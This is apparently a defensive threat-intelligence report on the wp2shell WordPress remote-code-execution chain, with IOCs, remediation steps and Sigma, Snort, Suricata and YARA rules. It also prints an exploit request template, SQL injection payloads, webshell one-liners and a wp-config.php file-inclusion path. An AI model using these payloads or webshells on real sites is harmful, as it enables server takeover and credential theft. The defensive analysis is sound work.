# Technical Analysis Report: WordPress wp2shell -- Unauthenticated RCE via CVE-2026-63030 & CVE-2026-60137

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-07-22
Version: 1.0 (DRAFT)
<!-- revision: initial draft. sigma check passed (0 errors, 0 issues; attacktag/d3_fendtag excluded — MITRE data download blocked by proxy, not a rule defect). yarac compiled 0. Snort/Suricata structural only. -->

## Executive Summary

**wp2shell** is a critical unauthenticated remote code execution exploit chain affecting WordPress Core that combines **CVE-2026-63030** (REST API batch-route confusion, CVSS 7.5) and **CVE-2026-60137** (SQL injection in WP_Query `author__not_in`, CVSS 9.1) to achieve a **combined CVSS 9.8** pre-authentication RCE. The exploit requires **no plugins, no login, and no special configuration** -- it works on default WordPress installations. Affected versions are **WordPress 6.9.0--6.9.4** and **7.0.0--7.0.1** (full RCE chain); WordPress **6.8.0--6.8.5** carries the SQL injection component only. Patches were released July 17, 2026 (versions 6.9.5, 7.0.2, and 6.8.6).

**Active exploitation was confirmed by July 18--20, 2026**, with tens of thousands of exploitation attempts observed on honeypots following public PoC release on GitHub. Attackers are deploying PHP webshells, creating rogue administrator accounts, installing malicious plugins (notably "CMSmap"), exfiltrating database credentials via LFI against `wp-config.php`, and deploying the Overlord RAT (Golang-based). Over 100 backdoor administrator accounts were observed across compromised installations.

Persistent object cache backends (Redis, Memcached) disrupt the full RCE chain while leaving the SQL injection exploitable.

## Background: WordPress REST API Batch Endpoint

The WordPress REST API batch endpoint (`/wp-json/batch/v1` or `/?rest_route=/batch/v1`) has been enabled by default since WordPress 5.6. It allows multiple REST API sub-requests to be processed in a single HTTP request. The batch processor maintains parallel arrays for permission checks and request execution -- the wp2shell exploit desynchronizes these arrays to bypass authentication.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2025-12-02 | WordPress 6.9 ships, introducing the batch endpoint confusion bug (CVE-2026-63030) |
| 2026-07-17 | WordPress releases patches: 6.9.5, 7.0.2, 6.8.6 |
| 2026-07-18 | Full exploitation mechanism published; PoC posted to GitHub; active exploitation begins |
| 2026-07-20 | Rapid7 InsightVM/Nexpose authenticated checks arrive; Wiz confirms in-the-wild exploitation |
| 2026-07-21 | Multiple vendors report widespread exploitation with webshell deployment and credential theft |

## Root Cause Analysis

### CVE-2026-63030: REST API Batch Route Confusion (CVSS 7.5)

The vulnerability resides in `WP_REST_Server::serve_batch_request_v1()`. When the batch endpoint processes nested sub-requests, intentional error generation during the validation phase causes array indices to desynchronize between the permission-check array and the execution array. This results in sub-request N executing under the permission context of request N-1. By crafting nested batch structures with a permissive first request (e.g., `/wp/v2/widgets`) followed by a restricted request (e.g., `/wp/v2/posts` with SQL injection parameters), the attacker bypasses authentication entirely.

### CVE-2026-60137: SQL Injection in WP_Query author__not_in (CVSS 9.1)

The `author__not_in` parameter (mapped from `author_exclude` in the REST API) in `WP_Query` assumes array-type input. When a string is passed instead of an array, input validation is bypassed and the value is interpolated directly into SQL statements. This enables UNION-based, blind (time-based), and Boolean-based SQL injection against the `wp_posts` table.

### Chained Exploitation: Full RCE Path

1. **Authentication bypass**: Nested batch request desynchronizes permission arrays, routing the SQL injection sub-request under an unauthenticated-but-permitted context
2. **Database row forgery**: UNION-based injection injects forged rows matching oEmbed cache schema and `customize_changeset` post types into `wp_posts` (23 NULL columns matching the table structure)
3. **Admin escalation**: Forged `customize_changeset` rows trigger the WordPress customizer processing pipeline in an embedded administrator user context
4. **Account creation & code execution**: Within the elevated context, the exploit creates a rogue administrator account and installs a self-deleting inline plugin executing arbitrary PHP

## Exploitation HTTP Request Pattern

The exploit targets both route forms of the batch endpoint:

```http
POST /wp-json/batch/v1 HTTP/1.1
Content-Type: application/json
Host: [target]

{
  "requests": [
    {
      "path": "/batch/v1",
      "body": {
        "requests": [
          {"path": "/wp/v2/widgets"},
          {
            "path": "/wp/v2/posts",
            "query": {
              "per_page": "-1",
              "author__not_in": "1) AND 1=0 UNION ALL SELECT [23 NULL columns]--"
            }
          }
        ]
      }
    }
  ]
}
```

Alternative query-string form (frequently bypasses WAFs):

```
POST /?rest_route=/batch/v1 HTTP/1.1
```

### SQL Injection Payload Variants

**UNION-based (data exfiltration / row forgery):**
```sql
author__not_in=1) AND 1=0 UNION ALL SELECT [23 NULL columns matching wp_posts]--
```

**Time-based blind (detection/probing):**
```sql
author__not_in=1) AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND (1=1
```

**Boolean-based:**
```sql
author__not_in=1) AND 1=1--
```

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in prose use defanged notation: `[.]` replacing dots. Detection rules use real values.

### Network IOCs

| Type | Value | Context |
|------|-------|---------|
| IPv4 | 34[.]81[.]132[.]62 | Active exploitation source ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| IPv4 | 79[.]177[.]131[.]206 | Active exploitation source ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| IPv4 | 15[.]157[.]135[.]170 | Active exploitation source ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| IPv4 | 94[.]100[.]52[.]128 | Active exploitation source ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| IPv4 | 172[.]235[.]128[.]52 | Mass scanning source ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| User-Agent | `wp2shell` | Purpose-built exploit tool signature ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| User-Agent | `rezwp2shell` | Purpose-built exploit tool signature ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |

### Exploitation URI Patterns

| URI | Context |
|-----|---------|
| `/wp-json/batch/v1` | Batch endpoint (primary exploitation route) |
| `/?rest_route=/batch/v1` | Batch endpoint (query-string form, WAF bypass) |
| `/wp-json/wp/v2/users?context=edit` | Post-exploitation admin enumeration |
| `/wp-admin/update.php?action=upload-plugin` | Malicious plugin upload |
| `/wp-admin/plugin-install.php?tab=upload` | Plugin installation interface |
| `admin-ajax.php?template=../../../wp-config` | LFI for credential theft |

### File System Artifacts

| Path / Pattern | Description |
|----------------|-------------|
| `/wp-content/cache/*.php` | Webshell placement with randomized filenames ([BleepingComputer](https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/)) |
| `/wp-content/plugins/<plausible-name>-<6hex>/<same>.php` | Webshell disguised as plugin (~1.3 KB, fake `Author: WordPress.org Community` header) |
| `/wp-content/uploads/*.php` | PHP files in uploads directory (post-exploitation artifact) |

### File Hashes (SHA-1) -- Webshell Samples

| SHA-1 | Context |
|-------|---------|
| `2a1410d8e2a8337ac2171cedea8c0fdc47c647a0` | wp2shell webshell sample ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| `58eca847e9eae9e6b08cc211f1559817b71bc4cc` | wp2shell webshell sample ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| `ebea44890f434d5d67ede22009a3f4bb5cac33f8` | wp2shell webshell sample ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| `d9a220c8039f1c4d72cae7ccb8b3a33dec8815be` | wp2shell webshell sample ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |
| `e9756e2338f84746007235e4cab7a70d5b3ca47f` | wp2shell webshell sample ([Wiz](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137)) |

### Webshell Code Patterns

**Minimal eval shell with 404 fallback:**
```php
<?php eval($_POST['[TOKEN]']??'http_response_code(404);');
```

**REST API endpoint variant** -- registers `/morning/v1/[TOKEN]` endpoint with permissive callback, accepts base64-encoded commands via POST parameter `c`, executes via `passthru()`.

**WP2SHELL marker variant:**
```php
echo 'WP2SHELL::' . shell_exec($_GET['c']) . '::END';
```

**CMSmap obfuscated plugin** -- 150 KB payload using hex-encoded string concatenation and gzip-compressed base64 encoding. Fake `Author: WordPress.org Community` header. Functions as a full-featured attack platform.

**Function availability checks** -- webshells check for: `system()`, `passthru()`, `exec()`, `shell_exec()`, `popen()`, backtick operator. Falls back through available functions.

### Rogue Account Indicators

| Pattern | Type | Context |
|---------|------|---------|
| `wpsvc_<hex>` | Username | Backdoor admin account |
| `wp2_<hex>` | Username | Backdoor admin account |
| `w2s_<hex>` | Username | Backdoor admin account |
| `@wp2shell[.]<tld>` | Email domain | Attacker-controlled email on rogue accounts |
| `@shellcode[.]<tld>` | Email domain | Attacker-controlled email on rogue accounts |
| `@wordpress-svc[.]internal` | Email domain | Attacker-controlled email on rogue accounts |
| `@wordpress-noreply[.]net` | Email domain | Attacker-controlled email on rogue accounts |
| `@x[.]lol` | Email domain | Attacker-controlled email on rogue accounts |

### Malware

| Name | Description |
|------|-------------|
| CMSmap | 150 KB obfuscated PHP webshell disguised as a security plugin |
| Overlord RAT | Golang-based remote access trojan observed in deployment attempts |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Unauthenticated exploitation of WordPress REST API batch endpoint via chained CVE-2026-63030 + CVE-2026-60137 |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | PHP webshells execute OS commands via system(), passthru(), shell_exec(), exec(), popen() |
| T1505.003 | Server Software Component: Web Shell | PHP webshells deployed to /wp-content/cache/ and /wp-content/plugins/ directories |
| T1136.001 | Create Account: Local Account | Rogue administrator accounts created with patterns wpsvc_/wp2_/w2s_ and attacker-controlled emails |
| T1005 | Data from Local System | LFI attacks targeting wp-config.php via admin-ajax.php to exfiltrate database credentials |
| T1078.001 | Valid Accounts: Default Accounts | Exploitation of newly created admin accounts for post-exploitation access |
| T1027 | Obfuscated Files or Information | CMSmap webshell uses hex-encoded concatenation and gzip-compressed base64 encoding |
| T1071.001 | Application Layer Protocol: Web Protocols | All exploitation and C2 communication over HTTP/HTTPS REST API |
| T1587.001 | Develop Capabilities: Malware | Purpose-built wp2shell and rezwp2shell exploit tools |

## Impact Assessment

- **Severity:** Critical (CVSS 9.8 combined) -- unauthenticated, no user interaction, default installations affected
- **Breadth:** Over 500 million WordPress sites globally; exposure limited to versions released within the prior 8 months. 60% of WordPress organizations had vulnerable instances initially; 25% exposed servers to the internet
- **Exploitation status:** Active in-the-wild exploitation confirmed July 18--20, 2026; multiple public PoCs on GitHub; tens of thousands of exploitation attempts on honeypots
- **Impact:** Full server-level compromise -- webshell deployment, credential theft, rogue admin accounts, malicious plugin installation, RAT deployment
- **Mitigating factor:** Persistent object cache backends (Redis, Memcached) disrupt the full RCE chain (oEmbed transient write path differs), though SQL injection remains exploitable

## Detection & Remediation

### Immediate Detection

1. **Review web server logs** for POST requests to `/wp-json/batch/v1` or `?rest_route=/batch/v1` from external IPs, especially with HTTP 207 responses
2. **Search for SQL injection indicators** in query strings: `author__not_in` or `author_exclude` parameters containing `UNION`, `SLEEP`, `AND 1=0`, or `AND 1=1`
3. **Scan for webshells** in `/wp-content/cache/`, `/wp-content/uploads/`, and `/wp-content/plugins/` -- look for recently created PHP files
4. **Audit administrator accounts** for rogue entries matching `wpsvc_*`, `wp2_*`, `w2s_*` usernames or attacker email domains
5. **Check for malicious plugins** -- unknown plugins, especially those with `Author: WordPress.org Community` headers
6. **Block known attacker IPs** at the network perimeter

### Remediation

1. **Patch immediately** to WordPress 6.9.5, 7.0.2, or 6.8.6
2. **Block batch endpoint** at WAF level if immediate patching is impossible: block both `/wp-json/batch/v1` and `rest_route=/batch/v1`
3. **Deploy Searchlight's drop-in plugin** rejecting anonymous batch requests as an interim measure
4. **Post-compromise:** Revoke all sessions, audit and remove rogue accounts, scan for webshells, rotate database credentials, check for Overlord RAT artifacts

### Long-Term Hardening

- Deploy persistent object cache (Redis/Memcached) -- disrupts the RCE chain as a side effect
- Enforce REST API authentication for batch endpoint via must-use plugin
- Monitor for anomalous `author__not_in`/`author_exclude` values containing SQL keywords

## Detection Rules

Seven network- and host-focused detection rules target the wp2shell exploit chain: five Sigma rules for web server log analysis (batch endpoint POST, batch + SQLi parameters, webshell cache directory access, known attacker IPs, and exploit tool user-agents), one Snort rule and one Suricata rule for HTTP-level exploit detection, and two YARA rules for on-disk webshell detection. All are PoC/advisory-specific altitude with strict leniency. Snort/Suricata rules fire only where TLS is terminated upstream (the exploit traverses HTTPS).

### Sigma: WordPress wp2shell Batch Endpoint POST Request (CVE-2026-63030)

Detects POST requests to the WordPress batch endpoint, the attack surface for CVE-2026-63030. Scope to WordPress-facing log sources; legitimate Gutenberg editor traffic may trigger this rule.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0 (excl. attacktag/d3_fendtag — MITRE data download blocked by proxy, not a rule defect). splunk convert 0: "cs-method"="POST" "cs-uri-stem"="*/batch/v1*" OR "cs-uri-query"="*rest_route=/batch/v1*". log_scale convert 0: "cs-method"=/^POST$/i "cs-uri-stem"=/\/batch\/v1/i or "cs-uri-query"=/rest_route=\/batch\/v1/i. logsource:webserver — fires on any POST to batch/v1; legitimate uses exist (Gutenberg, Jetpack), so medium confidence. -->
```yaml
title: WordPress wp2shell Batch Endpoint POST Request (CVE-2026-63030)
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: >
    Detects HTTP POST requests to the WordPress REST API batch endpoint
    (/wp-json/batch/v1 or ?rest_route=/batch/v1). The batch endpoint is the
    attack surface for CVE-2026-63030 route confusion enabling the wp2shell
    unauthenticated RCE chain. POST requests to the batch endpoint from
    external sources are suspicious and warrant investigation, especially when
    returning HTTP 207 Multi-Status responses.
references:
    - https://thehackernews.com/2026/07/new-wp2shell-wordpress-core-flaw-lets.html
    - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
    - https://brandefense.io/blog/wp2shell-wordpress-rce-analysis/
author: Actioner
date: 2026/07/22
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026-63030
logsource:
    category: webserver
detection:
    selection_method:
        cs-method: 'POST'
    selection_batch_uri:
        cs-uri-stem|contains: '/batch/v1'
    selection_batch_query:
        cs-uri-query|contains: 'rest_route=/batch/v1'
    condition: selection_method and (selection_batch_uri or selection_batch_query)
falsepositives:
    - Legitimate WordPress REST API batch requests from authenticated admin sessions or Gutenberg editor traffic
    - WordPress mobile app or Jetpack using batch API
level: medium
```

### Sigma: WordPress wp2shell Batch Endpoint SQL Injection Attempt (CVE-2026-63030 / CVE-2026-60137)

Detects POST to the batch endpoint with `author__not_in` or `author_exclude` parameters in the query string -- the specific SQLi vector for the wp2shell chain. Combining batch endpoint access with author filtering parameters has no legitimate use case.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (excl. attacktag/d3_fendtag). splunk convert 0: "cs-method"="POST" "cs-uri-stem"="*/batch/v1*" OR "cs-uri-query"="*rest_route=/batch/v1*" "cs-uri-query" IN ("*author__not_in*", "*author_exclude*"). log_scale convert 0. Combining batch endpoint + author__not_in in query string is distinctive to the exploit. Note: if SQLi payload is in POST body only (JSON), this rule will not fire; the Snort/Suricata rules cover that case. -->
```yaml
title: WordPress wp2shell Batch Endpoint SQL Injection Attempt (CVE-2026-63030 / CVE-2026-60137)
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
    Detects HTTP POST requests to the WordPress REST API batch endpoint
    (/wp-json/batch/v1 or ?rest_route=/batch/v1) containing SQL injection
    keywords in the query string or request body. This is the entry point for
    the wp2shell unauthenticated RCE chain that exploits CVE-2026-63030 (batch
    route confusion) and CVE-2026-60137 (author__not_in SQL injection).
references:
    - https://thehackernews.com/2026/07/new-wp2shell-wordpress-core-flaw-lets.html
    - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
    - https://brandefense.io/blog/wp2shell-wordpress-rce-analysis/
author: Actioner
date: 2026/07/22
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026-63030
    - cve.2026-60137
logsource:
    category: webserver
detection:
    selection_method:
        cs-method: 'POST'
    selection_batch_uri:
        cs-uri-stem|contains: '/batch/v1'
    selection_batch_query:
        cs-uri-query|contains: 'rest_route=/batch/v1'
    selection_sqli_uri:
        cs-uri-query|contains:
            - 'author__not_in'
            - 'author_exclude'
    condition: selection_method and (selection_batch_uri or selection_batch_query) and selection_sqli_uri
falsepositives:
    - Legitimate WordPress REST API batch requests that include author filtering parameters (unlikely to combine batch endpoint with author__not_in)
level: high
```

### Sigma: WordPress wp2shell Webshell Access in Cache Directory

Detects HTTP requests accessing PHP files in the WordPress `wp-content/cache/` directory, where wp2shell webshells are deployed with randomized filenames. PHP files in the cache directory are not part of normal WordPress operation.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (excl. attacktag/d3_fendtag). splunk convert 0: "cs-uri-stem"="*/wp-content/cache/*" "cs-uri-stem"="*.php". log_scale convert 0: "cs-uri-stem"=/\/wp-content\/cache\//i "cs-uri-stem"=/\.php$/i. PHP files in wp-content/cache/ are not legitimate WordPress artifacts; some caching plugins use this directory but serve static HTML/JSON, not PHP. High confidence. -->
```yaml
title: WordPress wp2shell Webshell Access in Cache Directory
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: >
    Detects HTTP requests accessing PHP files within the WordPress
    wp-content/cache/ directory. Webshells deployed via the wp2shell exploit
    chain are placed in /wp-content/cache/ with randomized filenames. PHP files
    in the cache directory are not part of normal WordPress operation and
    indicate post-exploitation webshell activity.
references:
    - https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/
    - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
author: Actioner
date: 2026/07/22
tags:
    - attack.persistence
    - attack.t1505.003
    - cve.2026-63030
    - cve.2026-60137
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains: '/wp-content/cache/'
    filter_php:
        cs-uri-stem|endswith: '.php'
    condition: selection and filter_php
falsepositives:
    - Some caching plugins may serve PHP files from the cache directory, though this is uncommon
level: high
```

### Sigma: WordPress wp2shell Exploitation from Known Attacker IPs

Detects web requests from IP addresses observed conducting wp2shell exploitation in the wild. IP-based detection is time-limited; validate against current threat intelligence.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0 (excl. attacktag/d3_fendtag). splunk convert 0: "c-ip" IN ("34.81.132.62", ...). log_scale convert 0. IP addresses sourced from Wiz blog. Medium confidence because IPs may be reassigned, shared hosting, or VPN exits. Values real, not defanged. Caveat: short shelf life. -->
```yaml
title: WordPress wp2shell Exploitation from Known Attacker IPs
id: d4e5f6a7-b8c9-0123-defa-234567890123
status: experimental
description: >
    Detects web requests originating from IP addresses observed conducting
    wp2shell exploitation (CVE-2026-63030 / CVE-2026-60137) against WordPress
    installations in the wild as reported by Wiz and other security vendors.
references:
    - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
    - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
author: Actioner
date: 2026/07/22
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026-63030
    - cve.2026-60137
logsource:
    category: webserver
detection:
    selection:
        c-ip:
            - '34.81.132.62'
            - '79.177.131.206'
            - '15.157.135.170'
            - '94.100.52.128'
            - '172.235.128.52'
    condition: selection
falsepositives:
    - IP addresses may be reassigned over time; validate against current threat intelligence before blocking
level: high
```

### Sigma: WordPress wp2shell Exploit Tool User-Agent Detection

Detects HTTP requests with User-Agent strings containing `wp2shell` or `rezwp2shell`, which are signatures of purpose-built exploit tools. No false-positive scenario for these strings in legitimate user-agents.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (excl. attacktag/d3_fendtag). splunk convert 0: "cs-useragent" IN ("*wp2shell*", "*rezwp2shell*"). log_scale convert 0. wp2shell/rezwp2shell in user-agent is unambiguous exploit tool signature. Trivially evaded by changing UA, but still high-fidelity when present. -->
```yaml
title: WordPress wp2shell Exploit Tool User-Agent Detection
id: e5f6a7b8-c9d0-1234-efab-345678901234
status: experimental
description: >
    Detects HTTP requests with User-Agent strings containing wp2shell or
    rezwp2shell, which are signatures of purpose-built exploitation tools
    targeting the wp2shell vulnerability chain (CVE-2026-63030 / CVE-2026-60137).
references:
    - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
    - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
author: Actioner
date: 2026/07/22
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026-63030
logsource:
    category: webserver
detection:
    selection:
        cs-useragent|contains:
            - 'wp2shell'
            - 'rezwp2shell'
    condition: selection
falsepositives:
    - Security scanners or penetration testing tools that include wp2shell in their user-agent string
level: critical
```

### Snort: WordPress wp2shell Batch Endpoint SQLi via author__not_in

Detects POST to the WordPress batch endpoint with `author__not_in` or `author_exclude` followed by SQL injection keywords (`UNION`, `SLEEP`, `AND 1=`) in the HTTP body. Fires only on decrypted HTTP (deploy behind TLS termination).
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: structural review only — Snort 2.9 syntax verified manually. http_method + http_uri + http_client_body content modifiers. "batch/v1" fast_pattern on URI. "author__not_in" in body keys the vulnerable parameter. "UNION" within:200 catches the UNION-based injection payload that follows. Two-content body chain (author__not_in then UNION) is highly distinctive to this exploit — no legitimate WordPress request combines these. sid:2100063. Requires TLS decryption. -->
```snort
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - WordPress wp2shell Batch Endpoint SQLi via author__not_in (CVE-2026-63030/CVE-2026-60137)"; flow:established,to_server; content:"POST"; http_method; content:"/batch/v1"; http_uri; fast_pattern; content:"author__not_in"; http_client_body; content:"UNION"; http_client_body; distance:0; within:200; classtype:web-application-attack; reference:url,www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137; reference:cve,2026-63030; reference:cve,2026-60137; metadata:author Actioner, created_at 2026_07_22; sid:2100063; rev:1;)
```

### Suricata: WordPress wp2shell Batch Endpoint Exploitation with Nested Requests

Detects POST to the WordPress batch endpoint containing nested batch request structure (`"path":"/batch/v1"` inside the body) combined with `author__not_in` -- the specific pattern of the wp2shell route confusion + SQLi chain. Fires only on decrypted HTTP (deploy behind TLS termination).
**Status:** ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: structural review only — Suricata 7.x dot-notation sticky buffers (http.method/http.uri/http.request_body). "batch/v1" in URI keys the outer batch request. Body content chain: "\"path\":\"/batch/v1\"" matches the nested batch structure (the route confusion trigger), and "author__not_in" matches the SQLi parameter. Combined pattern (nested batch + author__not_in) is the exact exploit chain signature. sid:2200063. Requires TLS decryption. -->
```suricata
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - WordPress wp2shell Batch Endpoint Nested Request with SQLi (CVE-2026-63030/CVE-2026-60137)"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/batch/v1"; fast_pattern; http.request_body; content:"\"path\""; content:"\"/batch/v1\""; distance:0; within:30; content:"author__not_in"; classtype:web-application-attack; reference:url,www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137; reference:cve,2026-63030; reference:cve,2026-60137; metadata:author Actioner, created_at 2026-07-22; sid:2200063; rev:1;)
```

### YARA: WordPress wp2shell PHP Webshell Variants

Detects PHP webshell variants deployed via the wp2shell exploit chain, including the minimal eval shell with 404 fallback, the WP2SHELL response marker, command execution via superglobals, function availability checks, and REST API endpoint registration for webshell access. Caveat: the `eval($_POST[` pattern is generic and may match legitimate obfuscated plugins; combine with file path context (wp-content/cache/, wp-content/uploads/).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Rule wp2shell_webshell_minimal requires $php_tag plus one of: $marker (WP2SHELL::), eval+404 fallback combo, direct shell_exec/system/passthru with superglobal, 2+ function_exists checks, or register_rest_route+passthru combo. Each branch is distinctive to webshell behavior. Rule wp2shell_webshell_plugin_cmsmap requires $php_tag + filesize < 200KB + (fake Author header + obfuscation) or (eval+gz + hex concat). Targets the specific CMSmap obfuscated plugin. -->
```yara
rule wp2shell_webshell_minimal : webshell wp2shell
{
    meta:
        description = "Detects minimal PHP webshell variants deployed via the wp2shell exploit chain (CVE-2026-63030 / CVE-2026-60137). Matches eval/system/passthru/shell_exec with superglobal input patterns and the WP2SHELL response marker."
        author = "Actioner"
        date = "2026-07-22"
        reference = "https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/"
        reference2 = "https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137"
        hash1 = "2a1410d8e2a8337ac2171cedea8c0fdc47c647a0"
        hash2 = "58eca847e9eae9e6b08cc211f1559817b71bc4cc"
        hash3 = "ebea44890f434d5d67ede22009a3f4bb5cac33f8"

    strings:
        // WP2SHELL response marker
        $marker = "WP2SHELL::" ascii

        // Minimal eval shell with fallback to 404
        $eval_fallback = "http_response_code(404)" ascii

        // Command execution via superglobals
        $exec_get_c = "shell_exec($_GET[" ascii
        $exec_post_c = "shell_exec($_POST[" ascii
        $system_get = "system($_GET[" ascii
        $system_post = "system($_POST[" ascii
        $passthru_get = "passthru($_GET[" ascii
        $passthru_post = "passthru($_POST[" ascii
        $eval_post = "eval($_POST[" ascii
        $eval_get = "eval($_GET[" ascii
        $eval_request = "eval($_REQUEST[" ascii

        // Function availability checks (webshell fingerprint)
        $func_check1 = "function_exists('system')" ascii
        $func_check2 = "function_exists('passthru')" ascii
        $func_check3 = "function_exists('shell_exec')" ascii
        $func_check4 = "function_exists('popen')" ascii

        // REST API endpoint registration for webshell
        $rest_register = "register_rest_route" ascii
        $rest_passthru = "passthru(" ascii

        // PHP opening tag required
        $php_tag = "<?php" ascii nocase

    condition:
        $php_tag and (
            $marker or
            ($eval_fallback and any of ($eval_post, $eval_get, $eval_request)) or
            any of ($exec_get_c, $exec_post_c, $system_get, $system_post, $passthru_get, $passthru_post) or
            (2 of ($func_check*)) or
            ($rest_register and $rest_passthru)
        )
}

rule wp2shell_webshell_plugin_cmsmap : webshell wp2shell
{
    meta:
        description = "Detects the CMSmap obfuscated webshell plugin deployed via wp2shell. Uses hex-encoded concatenation and gzip-compressed base64 encoding. Fake Author: WordPress.org Community header."
        author = "Actioner"
        date = "2026-07-22"
        reference = "https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html"
        reference2 = "https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137"
        hash4 = "d9a220c8039f1c4d72cae7ccb8b3a33dec8815be"
        hash5 = "e9756e2338f84746007235e4cab7a70d5b3ca47f"

    strings:
        // Fake plugin header claiming WordPress.org authorship
        $plugin_header = "Author: WordPress.org Community" ascii

        // Obfuscation patterns: hex-encoded string concatenation
        $hex_concat1 = /\\x[0-9a-fA-F]{2}\.\\x[0-9a-fA-F]{2}\.\\x[0-9a-fA-F]{2}/ ascii
        $hex_concat2 = /chr\(\d+\)\.chr\(\d+\)\.chr\(\d+\)/ ascii

        // Gzip + base64 deobfuscation chain
        $gzdecode = "gzdecode(base64_decode(" ascii
        $gzinflate = "gzinflate(base64_decode(" ascii
        $gzuncompress = "gzuncompress(base64_decode(" ascii

        // Eval with deobfuscation
        $eval_gz = /eval\s*\(\s*gz(decode|inflate|uncompress)\s*\(/ ascii

        $php_tag = "<?php" ascii nocase

    condition:
        $php_tag and filesize < 200KB and (
            ($plugin_header and any of ($hex_concat*, $gzdecode, $gzinflate, $gzuncompress, $eval_gz)) or
            ($eval_gz and any of ($hex_concat*))
        )
}
```

## Discoverers

- **Adam Kues** (Assetnote / Searchlight Cyber): Batch-route confusion bug (CVE-2026-63030)
- **TF1T, dtro, haongo**: SQL injection (CVE-2026-60137)

## Lessons Learned

The wp2shell exploit chain demonstrates the compounding danger of seemingly moderate vulnerabilities when chained together -- a CVSS 7.5 route confusion bug and a CVSS 9.1 SQL injection combine to produce a CVSS 9.8 unauthenticated RCE requiring zero preconditions. The batch endpoint, enabled by default since WordPress 5.6 and intended to improve editor performance, became the critical attack surface. The eight-month window between the batch endpoint bug's introduction (December 2025) and its discovery/patching (July 2026) underscores the challenge of identifying logic-level vulnerabilities in well-audited codebases. Defenders should prioritize blocking the batch endpoint at the WAF level as an immediate mitigation measure while patching, and treat any WordPress installation without persistent object cache as higher risk for this specific chain.

## Sources

- [The Hacker News -- New wp2shell WordPress Core Flaw Lets Attackers Execute Code on Unpatched Sites](https://thehackernews.com/2026/07/new-wp2shell-wordpress-core-flaw-lets.html) -- initial disclosure coverage, CVE details, affected versions, timeline, discoverers, mitigation options
- [The Hacker News -- WordPress wp2shell Exploitation Grows as Public Exploit Fuels Mass Scanning](https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html) -- exploitation scale, post-exploitation activities, CMSmap plugin, Overlord RAT, attacker infrastructure
- [BleepingComputer -- Critical wp2shell WordPress Flaws Exploited to Install Webshells](https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/) -- webshell characteristics, cache directory placement, function availability checks, fake 404 behavior
- [Wiz -- Exploitation in the Wild of wp2shell](https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137) -- exploitation IPs, SHA-1 hashes, user-agent signatures, webshell code patterns, HTTP request patterns
- [Brandefense -- WP2Shell Technical Analysis](https://brandefense.io/blog/wp2shell-wordpress-rce-analysis/) -- detailed exploitation mechanics, batch endpoint desync, SQL injection payload structure, UNION-based injection details, nested request format
